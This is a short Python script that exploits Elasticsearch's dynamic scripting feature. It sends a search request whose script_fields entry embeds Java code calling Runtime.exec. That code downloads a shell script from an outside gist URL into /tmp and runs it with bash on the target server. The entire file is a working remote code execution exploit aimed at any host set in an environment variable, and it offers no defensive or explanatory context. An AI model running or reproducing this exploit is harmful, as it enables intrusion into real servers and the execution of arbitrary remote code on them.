from datetime import datetime
from elasticsearch import Elasticsearch
import elasticsearch.helpers
import os, sys

host = os.environ.get("HOST") or "localhost"

exploit = """
import java.util.*;
import java.io.*;

Runtime.getRuntime().exec("curl -o /tmp/exploit.sh https://gist.githubusercontent.com/jandre/ed8ee7ddf1eb19622b3c/raw/3fe85938914c8d90e2d80568a2b9482384a6a680/gistfile1.sh");
Runtime.getRuntime().exec("bash /tmp/exploit.sh");
"""

payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }
      }
    },
    "script_fields": {
      "run": {
        "script": exploit
	}
   } 
}

#print payload
es = Elasticsearch(host=host)
print es.search(index="_all", body=payload)
